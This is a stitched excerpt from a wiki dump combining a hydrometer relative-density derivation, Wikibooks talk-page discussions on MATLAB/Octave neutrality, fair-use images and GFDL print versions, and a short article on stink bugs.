:&lt;math&gt;V_\mathrm{red} = \frac{m}{\rho_\mathrm{Ref.}}&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(3)&lt;/div&gt;

At this line, the specific gravity is 1.  When the hydrometer is placed in the new fluid, shown as green, a new mark is placed.  Note that the hydrometer has dropped slightly, hence the specific gravity is lighter in this fluid then in the first fluid.  Since the mass does not change and it is assumed that the gravitational constant does not change, the force holding up the hydrometer in the second fluid is the exact same as the force holding up the hydrometer in the first fluid, i.e &lt;math&gt;mg&lt;/math&gt;
:&lt;math&gt;
mg = \rho_\mathrm{New} (V_\mathrm{red}+(-\Delta x)A) g \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(4)&lt;/div&gt;
&lt;!--I originally defined delta x as being an increase if the line went down and a decrease if the line went up. This however required multiple instances of (-DX), so I ultimately redefined it.--&gt;

where
:&lt;math&gt;\Delta x&lt;/math&gt; is the displacement of the line.  Since the line went down, the displacement is negative.
:&lt;math&gt;A&lt;/math&gt; is the cross sectional area of the shaft.
:&lt;math&gt;
m = \rho_\mathrm{New} (V_\mathrm{red}-\Delta x A) \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(5)&lt;/div&gt;
:&lt;math&gt;
m = \rho_\mathrm{New} (V_\mathrm{red}) - (\rho_\mathrm{New}\Delta x A) \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(6)&lt;/div&gt;

Substituiting from equation 3
:&lt;math&gt;
m = m \frac{\rho_\mathrm{New}}{\rho_\mathrm{Ref.}} - (\rho_\mathrm{Ref.}\Delta x A) \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(7)&lt;/div&gt;

but
:&lt;math&gt;
\frac{\rho_\mathrm{New}}{\rho_\mathrm{Ref.}}\,
&lt;/math&gt;

is simply the relative density of the new fluid.  Hence...
:&lt;math&gt;
m = m RD_\mathrm{New/Ref.} - (\rho_\mathrm{New}\Delta x A) \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(8)&lt;/div&gt;
:&lt;math&gt;
1 = RD_\mathrm{New/Ref.} - \rho_\mathrm{New}\frac{\Delta x A}{m} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(9)&lt;/div&gt;
:&lt;math&gt;
RD_\mathrm{New/Ref.}-1 = \rho_\mathrm{New}\frac{(\Delta x) A}{m} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(10)&lt;/div&gt;

For small differences in RD, &lt;math&gt;\rho_\mathrm{New} = \rho_\mathrm{Ref.}&lt;/math&gt;, and hence 
:&lt;math&gt;
RD_\mathrm{New/Ref.}-1 = \rho_\mathrm{Ref.}\frac{(\Delta x) A}{m} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(11)&lt;/div&gt;

Knowing the original density, the cross-sectional area of the stalk, and the mass of the hydrometer, one can calculate the change of the relative density with respect to the reference fluid by simply measuring the displacement.  Note that if the hydrometer falls down, the RD has gone less then 1.  And if the hydrometer rises, RD is higher then the reference fluid. 

For more percise measurements:
:&lt;math&gt;
RD_\mathrm{New/Ref.}-1 = RD_\mathrm{New/Ref.}\rho_\mathrm{Ref.}\frac{(\Delta x) A}{m} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(12)&lt;/div&gt;
:&lt;math&gt;
1=RD_\mathrm{New/Ref.}(1 - \rho_\mathrm{Ref.}\frac{(\Delta x) A}{m}) \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(13)&lt;/div&gt;
:&lt;math&gt;
RD_\mathrm{New/Ref.} = \frac{1}{(1 - \rho_\mathrm{Ref.}\frac{(\Delta x) A}{m})} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(14)&lt;/div&gt;

Expanding this as an infinite geometric series:

:&lt;math&gt;
RD_\mathrm{New/Ref.} = \frac{1}{(1 - \rho_\mathrm{Ref.}\frac{(\Delta x) A}{m})} \,
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(15)&lt;/div&gt;
:&lt;math&gt;
RD_\mathrm{New/Ref.} = \sum_{k=0}^\infty ar^{k} = \frac{a}{1-r} = \sum_{k=0}^\infty (\frac{\rho_\mathrm{Ref.}(\Delta x) A}{m})^{k}
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(16)&lt;/div&gt;
:&lt;math&gt;
RD_\mathrm{New/Ref.} = 1 + (\frac{\rho_\mathrm{Ref.}(\Delta x) A}{m}) + (\frac{\rho_\mathrm{Ref.}(\Delta x) A}{m})^2 + (\frac{\rho_\mathrm{Ref.}(\Delta x) A}{m})^3 +....
&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(17)&lt;/div&gt;

As a first-order of approximation, this reduces to the previous formula.  Note that this formula becomes invalid if the hydrometer's density is greater than the density of the reference fluid, i.e. it sinks below the surface in the reference fluid.  That is the only way the term &lt;math&gt;(\frac{\rho_\mathrm{Ref.}(\Delta x) A}{m})&lt;/math&gt; (which can be seen as a relative density comparing the density of the reference fluid and the density of the entire mass of the hydrometer divided by the small displaced volume) can be greater than 1.

==Uses of relative density==
Relative density is often used by geologists and mineralogists to help determine the mineral content of a rock or other sample. Gemologists use it as an aid in the identification of gemstones. The reason that relative density is measured in terms of the density of water is because that is the easiest way to measure it in the field. Basically, density is defined as the mass of a sample divided by its volume. With an irregularly shaped rock, the volume can be very difficult to accurately measure.  One way is to put it in a water-filled graduated cylinder and see how much water it displaces.  Relative density is more easily and perhaps more accurately measured without measuring volume.  Simply suspend the sample from a spring scale and weigh it under water. The following formula is used to determine the specific gravity:
:&lt;math&gt;
G = \frac{W}{W - F}\,
&lt;/math&gt;

where
:&lt;math&gt;G&lt;/math&gt; is the relative density,
:&lt;math&gt;W&lt;/math&gt; is the weight of the sample (measured in pounds-force, newtons, or some other unit of force),
:&lt;math&gt;F&lt;/math&gt; is the force, measured in the same units, while the sample was submerged. 

Note that with this technique it is difficult to measure relative densities less than one, because in order to do so, the sign of F must change, requiring the measurement of the downward force needed to keep the sample underwater.

Another practical method uses three measurements. The mineral sample is weighed dry. Then a container filled to the brim with water is weighed, and weighed again with the sample immersed, after the displaced water has overflowed and been removed. Subtracting the last reading from the sum of the first two readings gives the weight of the displaced water. The relative density result is the dry sample weight divided by that of the displaced water. This method works with scales that can't easily accommodate a suspended sample, and also allows for measurement of samples that are less dense than water. Surface tension of the water may keep a significant amount of water from overflowing, which is especially problematic for small objects being immersed. A workaround would be to use a water container with as small a mouth as possible.

Relative density is not important physically as much as it is in reporting data to the masses.  It is difficult to explain the high density of iridium as simply being 22650 kg/m³.  To the masses, this number is just a large number.  But if the facts instead detailed that the density of iridium is nearly twice that of lead, people can understand how heavy iridium really is.  As a reporter, the relative density tells more information to the general public then the actual number does.

==Specific gravity of water==
The specific gravity of liquids or solids is defined as the ratio of density of the material to the density of distilled water. (S = density of the material/density of water). This implies that if the specific gravity is approximately equal to 1.000, then the density of the material is close to the density of water. If the specific gravity is large this means that the density of the material is much larger than the density of water and if the specific gravity is small this implies that the density of the material is much smaller than the density of water. 

The specific gravity of a gas is generally defined by comparing the density of the gas with the density of air at a temperature of 20 degrees Celsius and a pressure of 101.325 kPa absolute, where the density is 1.205 kg/m&lt;sup&gt;3&lt;/sup&gt;. Specific Gravity is unitless.

      <comment>/* Reorganization */ new section</comment>
      <text xml:space="preserve">== Please remain neutral ==

There's quite an anti-MATLAB point of view in the language used in this text at the moment, using phrases like &quot;MATLAB chokes on this&quot; (which is a correct colloquial expression for what happens, but since the example is of commands that are not legal MATLAB syntax, the implication that MATLAB somehow breaks or fails to run correctly is false) or &quot;This is a kludge&quot; or &quot;Octave properly parses this&quot; (both systems parse the example *properly*, but for one system it is not valid syntax).

This chapter should take a neutral tone of voice, appealing both to MATLAB users and Octave users. I use Octave and I don't want Octave users to come across as sounding like they have a grudge against MATLAB! Please help edit this page to a good neutral point of view. I'll make some changes now.

--[[User:Mcld|Mcld]] 23:31, 24 March 2007 (UTC)

: I agree, to avoid edit conflicts I won't make any changed until you're done, but the information in the article, though useful, could use some NPOV-itizing. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 23:37, 24 March 2007 (UTC)

We should reorganize this article into language differences, function differences, library differences. [[User:Angry bee|Angry bee]] ([[User talk:Angry bee|discuss]] • [[Special:Contributions/Angry bee|contribs]]) 20:04, 21 April 2011 (UTC)

== please update - MATLAB 7.0 is very outdated. ==

release 7.0 is release 14 which was shipped way before 2006. some of the statements are just incorrect or not valid anymore.

== Reorganization ==

For the benefit of the reader, I think this article should be reorganized in two parts:
* Matlab code that won't run in Octave
* Octave code that won't run in Matlab
Usually users are accustomed to either one and would like to make their code friendlier for the other environment.  I admit there might be some overlap between the two parts, but the point is that users who are interested in one of the two wouldn't be interested in the other part.  Your thoughts?

: Done (does [http://en.wikibooks.org/w/index.php?title=Wikibooks:Fair_use_policy&amp;diff=696746&amp;oldid=450342 this] include something like what you were thinking of?).

== Commons Images ==
I just want to put forward an idea right now, I am not necessarily suggesting that we try to do this any time soon. Several other wikimedia projects have banned all image uploads completely, and specify instead that all new images must be uploaded to commons. This would mean that the  licensing and enforcing that licensing would be left up to the people at commons, and not be a task for us. If our policies on images are sufficiently similar to those at commons, i suggest we try something like that, because commons is simply better equipped to manage images then we are. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:29, 16 February 2007 (UTC)

:Are there any compelling reasons for keeping image uploads to WB? My understanding is that the differing Fair Use policies are/were an example of such a reason, but are there others? 
:Certainly, it is very convenient for all other projects (including non-English WB, potentially even translations of en-WB) to have the images we use available on Commons. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 08:47, 17 February 2007 (UTC)

== Screenshots ==
G'day, I am fully supportive of the intention, but I am unclear about how this specifically relates to screenshots. My personal view is that screenshots are at times vital, or at a minimum, incredibly useful tools for instruction when talking about computer software packages. Often times, a picture tells a thousand words. But does this policy mean that screenshots of software under commercial copyright license cannot be be used in Wikibooks?

What are we to do about the screenshots already in use? For examples, please see [[:Category:Fair use screenshots]] and subcategories. 

I believe that a similar situation exists with [[:Category:Wikibooks fair use logos|Category:Logos]]. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 02:37, 16 February 2007 (UTC)

: That is true; is it possible to get permission from the owners of the program(s) to use them? I know at least that the MathWorks has a special setup for that purpose. WMF didn't make any explicit exceptions but that doesn't necessarily mean that they wouldn't be willing to make some, after all like I mentioned a lot of them do have uses that are difficult to fulfill without Fair Use unless we somehow obtain permission. [[User:Mattb112885|Mattb112885]] 02:50, 16 February 2007 (UTC)

::I notice that [[Commons:]] has [[Commons:Category:Windows Screenshots|Category:Windows Screenshots]], which seems to have some images showing bits of the Windows desktop. Commons refers to [http://www.jisclegal.ac.uk/publications/copyrightalexmorrisson.htm this document] on screenshots and copyright, however, which appears to suggest that '''no''' screenshots of software under a copyright license would be acceptable, on Commons at least, without permission to distribute freely. I wonder what Microsoft would say? (will do some digging in their doco and website, to see whether the issue is addressed somewhere) [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 03:11, 16 February 2007 (UTC)

:::[http://www.microsoft.com/about/legal/permissions/default.mspx#E3C This] sounds promising: ''Except for Microsoft product boot-up screens, opening screens, &quot;splash screens,&quot; or screens from products that have not been commercially released (including beta versions), you may use screen shots in advertising, in documentation (including educational brochures), in tutorial books, in videotapes, or on Web sites, provided you adhere to the following guidelines: [...] 7. You must include the following copyright attribution statement: &quot;Microsoft product screen shot(s) reprinted with permission from Microsoft Corporation.&quot; [...]''
:::We'll need to make a template for Microsoft screenshots, at least. With any luck, other software companies will be so obliging. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 03:23, 16 February 2007 (UTC)

:::: That sounds promising indeed. I think it would be in most companies best interests to allow people to use screenshots for things like this, after all its like free advertising for them.

== Logos vs Icons ==

G'day, I looked into the abyss and the abyss looked back, so I backed off to let my poor brain recover somewhat. Maybe someone else can take a look and make some recommendations.

Microsoft have separate policies covering [http://www.microsoft.com/about/legal/permissions/default.mspx#E4D product icons] and [http://www.microsoft.com/about/legal/intellectualproperty/trademarks/logo/default.mspx Microsoft logos]. This makes sense, but also introduces complexities. It actually sounds to me like a big problem for us to use logos, but no problem for us to use product icons. Thus, we could create a licensing template for Microsoft product icons, and be very explicit about its use (i.e. not to be used for trademarked logos!) I strongly suspect that the same situation will apply for other software vendors, and that other trademarked logos (including most of [[:Category:Wikibooks fair use logos|these]]) will be unusable without Fair Use.

I'd appreciate it if someone else took a look at this and made some comments. I will proceed no further with this line of work until then. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 08:58, 17 February 2007 (UTC)

: Reading both those pages, it looks like we would need product icons and Microsoft logos to be used under fair use. Remember that any material licensed under the GFDL (which is everything on this site, with the exception of images licensed otherwise) is subject to copying, editing, and redistribution as long as the GFDL license is preserved. There are, however, specific restrictions on use of product icons according to Microsoft's legal page. That does not go well with the GFDL. Granted, the use of product icons specifically in a contextual educational environment is okay -- which is good for us, because we will use them as such. On Wikipedia, for example, I would imagine a license being created for these product icons which would say, &quot;For the purposes of Wikipedia, these icons are being used under fair use and must have an accompanying fair use rationale,&quot; because that is Wikipedia policy. We don't have a fully fleshed policy yet, so I don't know what I would consider as requirement for use of the icons. But I would support a policy akin to Wikipedia's. --[[User:Iamunknown|Iamunknown]] 00:25, 19 February 2007 (UTC)
:: It doesn't even sound as if it would be used per fair use, but rather it would be use of a copyrighted work, with permission of the copyright holder, because the sites says you can use it in a educatinal enviroment, like wikibooks, but that brings up an issue of wikibooks has permission to use it, but, oftne titmes someone might see it on here and think its &quot;free content&quot; and use it elsewhere without going to the image page and seeing the notice of the restrictions Microsoft has on their use.  I am not sure how such could be delt with, without having to put a disclaimer in the caption for such images wherever they are used.[[User:RyanB88|RyanB88]] 00:31, 19 February 2007 (UTC)
::: But because we need to consider downstream use (due to the copy-edit-redistribute GFDL license) it would still need to be used under something akin (if not equal to) fair use. People could think that because everything on this site is GFDL'd that they can use these icons for any purpose, decorative or inappropriate. --[[User:Iamunknown|Iamunknown]] 03:35, 19 February 2007 (UTC)
: the problem I see with this is often if an image is posted on a WMF project it is assumed that it is under a free license and can be redistributed, however this is not the case with Microsoft Icons which are subject to copyright, but used with permission, I am not sure how that would work.[[User:71.217.206.24|71.217.206.24]] 00:26, 19 February 2007 (UTC)
:: Exactly. But if we declared that we are using them in an educational environment, but one which anyone could grab the icons and legally use it ''anywhere else'' (including a non-educational environment), without permission under fair use, then that distinction would be obvious. --[[User:Iamunknown|Iamunknown]] 03:35, 19 February 2007 (UTC)

:::See [[WB:COPY#Fair Use Material]], and note that the footer on every page on WB says ''&quot;All text is available under the terms of the GNU Free Documentation License (see Copyrights for details)&quot;''. I don't think we need to be as concerned about this as either of you suggest, as long as every image is correctly licensed and the license tags explain the situation sufficiently (including links to text backing up any claims).

== Move to Enforce/Reject ==
This policy proposal is succinct and will do a good deal to help keep us out of legal problems in the future. We should not be without some kind of policy on this matter, because fair use represents a dangerous fringe area of copyright law, one that is not accepted in many countries around the world. Containing fair use materials will make it difficult, if not completely illegal, to print or publish our works in many countries. However, not allowing fair use content will be very restrictive, and will reduce the quality (if only on a temporary basis) of some books, until suitable replacements for that content can be found. I propose that we act on this issue ASAP, and choose one of two options:
#Accept and enforce this policy the way it currently stands, or with some alterations in text, but keeping the general meaning and spirit of the current version the same.
#Reject this policy and any rewording of it, instead opting to ban fair use content entirely. We would need to draft a replacement policy to ban such materials and move to enforce it.
I personally am inclined to say wikibooks would be better off without fair use materials, but considering that this proposal is well-written and sufficiently restrictive, i would be fine with it if people wanted to enforce this policy. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:06, 25 January 2007 (UTC)
:: Wow I had no idea about that message from WMF, that'll surely wreck some havoc in WP where basically every title image is listed under fair use. At least we should prevent too many of them from coming in here before we have the same predicament (even though it appears that most modules in WB don't rely as heavily on images as those on WP, except for some specific exceptions like Wikijunior books). I made some relatively minor changes to the text of the article, but I mean I agree that fair use should not be used in a project like this, IMO if you want to use an image use a free one\make your own, or get permission like real books do for images that they cannot otherwise print due to copyrights. [[User:Mattb112885|Mattb112885]] 02:16, 16 February 2007 (UTC)
: I disagree that we must choose either one proposal or the other. I think it would be feasible to craft policy that allowed for ''significantly limited'' (much more than is currently acceptable on either Wikibooks or on Wikipedia) use of media used without permission '''if''' it would be practically impossible to replace the media with a free media and also allowed for small textual quotations. --[[User:Iamunknown|Iamunknown]] 07:56, 16 February 2007 (UTC)
:: I would need to read up on the differences between properly cited textual quotations, and the use of text as &quot;fair use&quot;. I believe that text can be reproduced in small quantities so long as it is properly cited, and not fall under the category of fair use. I think that fair use needs to be highly limited, at least to the point that we are as restrictive as the WMF is (if not more so). We cannot be less restrictive. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:25, 16 February 2007 (UTC)
::: I hate to break the news here, but copying words without premission is a copyright violation, even if it is just a single word.  When you do a quote, it is through fair use concepts that you can republish that quote.  A citation is just a way to justify why you are using the information and document that you know that the content you have copied is not your own, but you are using somebody else's words.  This is fair use at its most fundimental level.  --[[User:Robert Horning|Rob Horning]] 21:32, 27 February 2007 (UTC)</text>

      <text xml:space="preserve">==What does it look like?==
[[Image:Becho_Bastavales_Galicia_5.jpg|thumb|350px|right|The Red and Black Shield Bug (pictured) is a kind of stinkbug.]]

Stink bugs are part of the superfamily Pentatomidae, the third largest family of true bugs. “Penta” refers to their five-segmented antennae. Stink bugs are also called shield bugs because their thick wing covers look like a shield. Shield bugs do not belong to the Penta group. 

Many stink bug species are brown or green but some are bright red and easy to spot. They are usually 1/4-inch to 3/4-inch long. Predacious stink bugs belong to the subfamily Asopinae, in which the first segment of the beak is fat and directed away from the head. Plant-sucking stink bugs have a thinner beak, pressed under the head. 

Adult stink bugs have scent glands which open on the thorax (midsection). They get their name from the foul smelling compounds discharged near the hind legs. Immature stink bugs usually have scent glands which open on the abdomen. 

Common names, colors and shield designs vary depending on the species. The green vegetable bug or green stink bug is light green with three pale spots on the edge of its thorax. The forest bug has a rounded head and bands of black and orange on the sides of its abdomen. Its legs are a reddish color. 

The harlequin stink bug is about 1/8-inch long. It has a distinctive red and black pattern on its broad shield. The immature nymphs are very colorful. 

The green soldier bug is 1/2-inch to 3/4-inch long. Its shield is bright green with yellow, orange or reddish edges. The nymph stage has an oval-shaped, green body with yellow and black markings.  

The conspicuous stink bug is 1/4-inch to 5/8-inch long. Its shield is shiny blue-black with an orange band that may surround two black spots. The anchor bug has an unusual red-orange anchor shape on its shield

==Where does it live?==

Stink bugs are found throughout the world. Two-spotted stink bugs are found east of the Rocky Mountains in the United States and Canada. They live in fields and meadows. They are commonly seen on exposed plant surfaces such as stems and leaves. The green soldier bug is found throughout North America in crop fields, orchards, and gardens.

==What does it eat?==

Stink bugs are sap-suckers that feed on a wide variety of vegetation. About two-thirds of stink bug species are plant feeders (sometimes pests). Some species feed on both plants and animals or start life feeding on plants and later become predators. Some predatory stink bugs suck the juices of caterpillars and beetle larvae.  

Green soldier bugs feed on plant juices from leaves, flowers, and fruits. Two-spotted stink bugs suck juices from weeds. Forest bugs feed on deciduous trees, like oaks and maples. Harlequin stink bugs attack cabbage, cauliflower, turnips and other vegetable crops.

==How does it defend itself?==

When they are disturbed they emit a strong defensive smell from their scent glands. The smell comes from cyanide compounds having a rancid almond scent. They have little need to hide because their foul smell keeps predators at a distance. The bad odor serves as a kind of chemical alarm for friends and a deterrent for enemies.

Their slow movement may help them avoid attention of predators. They do not bite, but if held tightly they may use piercing mouthparts to stab a hand. Their eggs may have spines for protection.

==What stages of metamorphosis does it go through?==

Stink bugs belong to the Order Hemiptera so they undergo incomplete metamorphosis. There is no pupal stage between the larval phase and the adult phase. The young nymphs resemble adults but have no wings. 

Adults usually hibernate in winter and begin laying eggs in late spring or early summer. Females lay clusters of barrel-shaped eggs on plants. The clusters are stuck to each other and to flowers or leaves by a sticky substance. Nymphs feed throughout the summer. 

Many nymphs are herbivores at first, but later become predators or omnivores. They molt to adults in late summer. One or two generations hatch each year. A few species guard the eggs until they hatch, and even take care of the young nymphs.

==What special behavior does it exhibit?==

Stink bugs move very slowly. Their slow movement, especially in the early morning, makes them easy to harvest, like a crop. In some cultures, stink bugs are used to add flavor to stews, or eaten for their own sake. 

The predatory spined soldier bugs are often seen sitting on leaves or flowers with caterpillars impaled on their outstretched beaks.

==How does this bug affect people?==
The plant-sucking stink bugs include crop-damaging pests, such as the Southern Green Stink Bug and the Harlequin Bug. The green stink bug is a pest of fruit, vegetables, and grains. The green soldier bug damages fruit trees, soybeans, cotton, and corn. 

About a third of North American stink bugs are beneficial predators of caterpillars and other harmful insects. The anchor bug, for example, preys on Mexican bean beetles and Japanese beetles. 

Species with big shoulder spines prey on tent caterpillars and webworms. Their spines go right through the protective walls of the shelters to impale the prey. Some predacious stink bugs have enormous appetites for crop pests. An adult two-spotted stink bug can destroy 150 to 200 Colorado potato beetle larvae over the course of its life.

== Expanding this book ==

Ehh... very good and descriptive way to start it off, but I think this should be just the beginning of the book. I suggest moving the current contents into a &quot;Getting Started&quot; chapter, and for the rest of the book, we can assume prior programming knowledge, and introduce everything the system is capable of.

the links to the SDK were giving me a 503 error...
and from what I could tell all of this is windows specific... I don't know if there is a way to do this on linux but I would like to have learned that from the book
on closer expection many of the links at the bottom of the page are broken as well

I think some missing contents listed above do not make since as being part of this book. Describing the compleat details of how to use any specific library could be a book within itself. I think if any description is given in this book at all for libraries thats dependent on knowledge of a specific architecture or operating system it should be kept to a minimal description of what the library is and what its useful for and perhaps a link to a website or a wikibook that does cover how to use the library API. For example wxWidgets is already described in this fasion. OTOH libraries that are not dependent on knowledge of a specific architecture or OS I think may fit in here such as the Boost library. --[[User:Darklama|darklama]] 18:41, 21 October 2006 (UTC)

== TOC2/Print version ==

The marked page displays a finished product ready for printing removing the credits to authors and other copyright holders or works used on it's creation, in violation to the enforced [[Wikibooks:Copyrights|Wikibooks Copyrights policy]]--[[User:Panic2k4|Panic]] 00:07, 22 October 2006 (UTC)

----

Its not in violation of the Copyrights policy. Its still part of the same wikibook and provides a link back to the main page.

&lt;div style=&quot;border: 1px solid black; background: white;&quot;&gt;
2. Provide a functional link back to the Wikibooks book or Wikibooks module (this satisfies the author credit requirement of our license)
&lt;/div&gt;

--[[User:Darklama|darklama]] 00:30, 22 October 2006 (UTC)

----

I did not mark the TOC but the print version (as a finished product) not a navigational aid, it generates a stand alone version of the book and clearly provides incentive on creating one copy that violates the copyright policy--[[User:Panic2k4|Panic]] 00:42, 22 October 2006 (UTC)

----

The copyright policy does not require listing of authors just a link back to the wikibook or module, which it does. So its not in violation of the copyright policy even if it were a seperate stand alone work, which I disagree that it is. --[[User:Darklama|darklama]] 00:54, 22 October 2006 (UTC)

----

Then we agree to disagree, the stand alone &quot;generated&quot; version doesn't not provide information required by the copyright policy and it is intended to create a stand alone work, that will be outside of wikibooks control, if the &quot;generator&quot; version was not on the same namespace or even on wikibooks that would be clear, but a violation is generated by its use.
In any case this will provide some needed clarification, the wording is clear &quot;POSSIBLE&quot;, so lets see what others think on this topic, this will also help building the new policies. --[[User:Panic2k4|Panic]] 01:04, 22 October 2006 (UTC)

----

Well then, until such time the copyright violation notice you put on it should be removed. All I can say is if its in violation so too then must be the other whole book view, since it is meant to be finished product, not just a navigation aid in my opinion. They are both navigation aids and aids for easy printing. Neither is compleatly seperate from the other. Both are reflections of the same shared contents of individual modules, abit one doesn't include all the contents the other one does, which isn't a requirement anyways. --[[User:Darklama|darklama]] 02:28, 22 October 2006 (UTC)

----

Huh ?!?, the other book views all include the copyright information that your print version removes and yes if it is your opinion that the full view without full display/inclusion of the GFDL copy (that can possibly be used for a print copy, even if a print version with the license is given to the users), you may add the tag, it would be productive to see what others, that will have to deal with the tags would think of it.

I remember a similar discussion about print versions (not the full view on C++ Programming) that didn't provide the GFDL copy, can't remember how it unfolded but I think it was removed, (but it was intended for printing, not as a navigation aid as is intended on the full view, even if you don't agree with it) so , if you think it violates copyright (by missing to the GFDL, since the GFDL is included at the bottom of the page), you should add the tag. I can't see the logic in it, but others may.

I agree that if you provide all the needed information the page will comply with the copyright policy (but I know it is not your view and that the removal was intentional, since we have established our divergences), this was one of the reasons that I took the speedier decision to add the tag (in place of correcting the print version or trying to reach a consensus) and reduce the time someone could use it to produce a copy that would violate the work copyrights.
If not please let the tag stay and in a week we shall see what is the result.--[[User:Panic2k4|Panic]] 03:00, 22 October 2006 (UTC)

----

It includes a copy of the GFDL text at the end already. I guess you missed that? I think this possible another case of you trying to use your interpretation of policy without discussion, as you already know needs to be discussed if you wish to have it settled/resolved. --[[User:Darklama|darklama]] 03:08, 22 October 2006 (UTC)

----

No [[User:Darklama|darklama]] what is missing is stated in the first post on this page, the GFDL references I made refers to the page you said would also violate the Copyright policy.--[[User:Panic2k4|Panic]] 03:14, 22 October 2006 (UTC)

----

And now we're going in circles again. I already explained how the first thing you said is not a requirement. So I think the copyright violation tag should be removed, until you've had the copyright business settle/resolved. Its going to take more then 7 days in my opinion to do that. There's nothing stoping you from adding it back at a later time if it makes since to do so. --[[User:Darklama|darklama]] 03:23, 22 October 2006 (UTC)

----

Can you agree to let it stay and wait for a decision that will take only one week ? The copyright problem seems to be clear in this case(I know you disagree with me on that point), as this should be easy and quick for a third party to moderate we should avoid a reversion battle on this point.--[[User:Panic2k4|Panic]] 04:16, 22 October 2006 (UTC)

----

I agree we should avoid a reversion battle on this point, thats why I'm asking you to remove it yourself. I think the whole copyright issue should be resolved since that seems to be your main concern before you suggest that pages are in violation of copyright or people are in violation of not following copyright laws or not following GFDL requirements. So that it doesn't constantly have to be brought up and discussions repeated. I'm willing to agree to mediation on this if you want. Shall we ask [[User:SBJohnny|SBJohnny]] or [[User:Whiteknight|Whiteknight]] to weigh in on it, since they are already famulior with both our views on this? --[[User:Darklama|darklama]] 04:28, 22 October 2006 (UTC)

== Response ==

I actually talked to a lawyer about this stuff recently. I'm not sure if this is copyvio or not though, because I don't know how those transcluded pages render on a printed version. When you print an individual page, the wikimedia software auto-includes a link to each page and the last time the page was edited, which is apparently all that's necessary. If the transcluded pages render with this information intact, it should be OK, but if you're planning on selling a lot of copies, you might want to consult a copyright lawyer just to be safe. 

If the transcluded pages do not include that information, you'll have to add it, and make sure it's kept up-to-date.

Derbeth also has a perl script for this that addresses the issue in some way, but I haven't used it (Whiteknight has, so you might want to ask him... he should be around this evening or tomorrow). --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 11:43, 22 October 2006 (UTC)

It does show the web address just as you say on every page. I don't think Panic disputes that. I think he disputes that its in copyright violation because it doesn't include a page that he thinks is required in order to be compliant with Wikibook's Copyright policy. --[[User:Darklama|darklama]] 13:20, 22 October 2006 (UTC)

----

I'm not a lawyer, but I had a law course especially on copyright and contractual problems on my final year at the University (with IT in mind).

The information missing is required by the policy to be displayed on a final copy of the work (since the page is included on the work itself, in itself it doesn't violate the rules since it is on wikibooks and on the same namespace, but its function is to provide a way of creating free standing copy (number is not relevant), that mirrors its content (no links or references are substitute to the inclusion of the GFDL and the missing copyright info, this is self evident by the inclusion of the full GFDL on print copies, and so the other information is required also...)--[[User:Panic2k4|Panic]] 15:08, 22 October 2006 (UTC)

----

I'm not a lawyer either, so I think we can agree not to pretend that we are.

I think you will find I was following [[Help:Print_versions]] and I don't see any requirement to substitute links or references in the inclusion of the GFDL and this is by no means the only wikibook with a version available for printing. Required copyright information does seem to have a connection to the issue of what rights people have to contents submitted to Wikibooks, in my view. This is why I think its still the same copyright issue. I disagree its necessary, but will relax a bit on it, if you will too.

I think I may have a solution that may satisfy you though for now. Break the Foreword module up so that Authors listing and the boilerplate GFDL copyright notice (which seems to be missing from it) are on one page seperate from the foreword section. If we can agree to the contents of the Authors module, then I'll add it to this print version. This would require relaxing of what you believe is the requirement to be listed as an author as I believe it is in violation of GFDL, Wikibook policies and the spirit of Wikibooks, and that is why I did not have it included on the page. --[[User:Darklama|darklama]] 16:07, 22 October 2006 (UTC)

----

Sorry, for not seen you post [[User:Darklama|darklama]], the GFDL copy as the authors page that are needed is on the every print function (that will be mirrored to the hard copy it generates), except the one I marked as being a possible violation.

GFDL requests that the authors page is displayed on the cover but wikibooks does some modifications to that, even so there is a direct link provided so in that point there shouldn't be a problem, the problem is only with this version of the print function.--[[User:Panic2k4|Panic]] 22:30, 22 October 2006 (UTC)

----

The only time you need to provide an author's list, etc. (assuming that's the issue of contention), is if you publish a &quot;modified version&quot;. Modified versions are created when you take the text of this book off of the wiki, and then modify it for your own purposes before publishing (this includes things like changing the title, etc... for example, if I were to copy a bunch of pages from [[A Wikimanual of Gardening]], I might want to rename it &quot;A Pennsylvania Garden&quot;, and then change all the chapters about individual plants to reflect what time of year they bloom, Pennsylvania nurseries that carry the plants in question, and so on. In that case I would be required to do the things in Section 4 of the GFDL. 

